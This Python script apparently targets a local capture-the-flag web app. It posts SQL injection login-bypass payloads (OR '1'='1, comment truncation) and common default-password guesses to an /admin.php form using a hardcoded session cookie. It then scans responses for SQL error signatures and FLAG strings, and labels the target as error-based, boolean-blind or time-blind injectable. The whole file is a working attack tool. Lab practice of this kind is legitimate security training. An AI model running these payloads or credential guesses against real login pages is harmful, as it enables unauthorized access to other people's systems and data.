import requests
import re

# Target configuration
base_url = "http://127.0.0.1:32817"
admin_endpoint = f"{base_url}/admin.php"

# Session cookie from context
cookies = {
    "PHPSESSID": "1be838a0271333bc548391c1dae99848"
}

# Test cases with various authentication attempts
test_cases = [
    {
        "name": "SQL Injection - OR 1=1",
        "username": "admin' OR '1'='1",
        "password": "test"
    },
    {
        "name": "SQL Injection - Comment bypass",
        "username": "admin'--",
        "password": ""
    },
    {
        "name": "SQL Error trigger - Single quote",
        "username": "admin'",
        "password": "test"
    },
    {
        "name": "Credential test - admin/admin",
        "username": "admin",
        "password": "admin"
    },
    {
        "name": "Credential test - admin/password",
        "username": "admin",
        "password": "password"
    },
    {
        "name": "Credential test - admin/123456",
        "username": "admin",
        "password": "123456"
    }
]

print("="*80)
print("AUTHENTICATION AND SQL INJECTION TESTING ON /admin.php")
print("="*80)

# Store results for comparison
results = []

for i, test in enumerate(test_cases, 1):
    print(f"\n[TEST {i}] {test['name']}")
    print(f"Username: {test['username']}")
    print(f"Password: {test['password']}")
    print("-"*80)
    
    try:
        # Send POST request
        response = requests.post(
            admin_endpoint,
            data={
                "username": test["username"],
                "password": test["password"]
            },
            cookies=cookies,
            allow_redirects=False,
            timeout=10
        )
        
        # Print response details
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response Length: {len(response.content)} bytes")
        print(f"[+] Response Time: {response.elapsed.total_seconds():.3f}s")
        
        # Print headers
        print(f"[+] Response Headers:")
        for header, value in response.headers.items():
            print(f"    {header}: {value}")
        
        # Print cookies if any
        if response.cookies:
            print(f"[+] Response Cookies:")
            for cookie in response.cookies:
                print(f"    {cookie.name}: {cookie.value}")
        
        # Print response body
        print(f"\n[+] Response Body:")
        print(response.text)
        
        # Analyze response for SQL errors
        sql_error_patterns = [
            r"SQL syntax",
            r"mysql_fetch",
            r"mysql_query",
            r"mysqli",
            r"syntax error",
            r"Warning.*mysql",
            r"ORA-\d+",
            r"SQLite.*error",
            r"PostgreSQL.*ERROR",
            r"Driver.*SQL",
            r"ODBC.*error",
            r"unclosed quotation mark"
        ]
        
        sql_errors_found = []
        for pattern in sql_error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                sql_errors_found.append(pattern)
        
        if sql_errors_found:
            print(f"\n[!] SQL ERROR DETECTED:")
            for error in sql_errors_found:
                print(f"    Pattern matched: {error}")
        
        # Look for authentication indicators
        auth_success_patterns = [
            r"welcome",
            r"dashboard",
            r"logged in",
            r"authentication successful",
            r"admin panel",
            r"FLAG\{[^}]+\}"
        ]
        
        auth_fail_patterns = [
            r"invalid",
            r"incorrect",
            r"failed",
            r"denied",
            r"unauthorized"
        ]
        
        success_found = []
        for pattern in auth_success_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                success_found.append(pattern)
        
        fail_found = []
        for pattern in auth_fail_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                fail_found.append(pattern)
        
        if success_found:
            print(f"\n[!] SUCCESS INDICATORS FOUND:")
            for indicator in success_found:
                print(f"    Pattern matched: {indicator}")
        
        if fail_found:
            print(f"\n[-] FAILURE INDICATORS FOUND:")
            for indicator in fail_found:
                print(f"    Pattern matched: {indicator}")
        
        # Check for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"\n[!!!] FLAG FOUND: {flag_match.group(0)}")
        
        # Store result for comparison
        results.append({
            "test": test["name"],
            "status": response.status_code,
            "length": len(response.content),
            "time": response.elapsed.total_seconds(),
            "sql_errors": len(sql_errors_found) > 0,
            "success_indicators": len(success_found) > 0,
            "fail_indicators": len(fail_found) > 0
        })
        
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {str(e)}")
        results.append({
            "test": test["name"],
            "status": "ERROR",
            "error": str(e)
        })

# Summary analysis
print("\n" + "="*80)
print("SUMMARY ANALYSIS")
print("="*80)

for result in results:
    print(f"\n{result['test']}:")
    if "error" in result:
        print(f"  ERROR: {result['error']}")
    else:
        print(f"  Status: {result['status']} | Length: {result['length']}B | Time: {result['time']:.3f}s")
        print(f"  SQL Errors: {'YES' if result['sql_errors'] else 'NO'}")
        print(f"  Success Indicators: {'YES' if result['success_indicators'] else 'NO'}")
        print(f"  Fail Indicators: {'YES' if result['fail_indicators'] else 'NO'}")

# Determine SQL injection type
print("\n" + "="*80)
print("SQL INJECTION VULNERABILITY ASSESSMENT")
print("="*80)

sql_error_tests = [r for r in results if r.get("sql_errors")]
if sql_error_tests:
    print("[!] ERROR-BASED SQL INJECTION: LIKELY VULNERABLE")
    print("    SQL errors detected in responses, indicating potential error-based SQLi")

# Check for response differences (boolean-based blind SQLi)
response_lengths = [r.get("length") for r in results if isinstance(r.get("length"), int)]
if len(set(response_lengths)) > 1:
    print("[!] BOOLEAN-BASED BLIND SQLi: POSSIBLE")
    print(f"    Different response lengths detected: {set(response_lengths)}")

# Check for time differences (time-based blind SQLi)
response_times = [r.get("time") for r in results if isinstance(r.get("time"), float)]
if response_times:
    avg_time = sum(response_times) / len(response_times)
    max_time = max(response_times)
    if max_time > avg_time * 2:
        print("[!] TIME-BASED BLIND SQLi: POSSIBLE")
        print(f"    Significant time variation detected (avg: {avg_time:.3f}s, max: {max_time:.3f}s)")

print("\n" + "="*80)
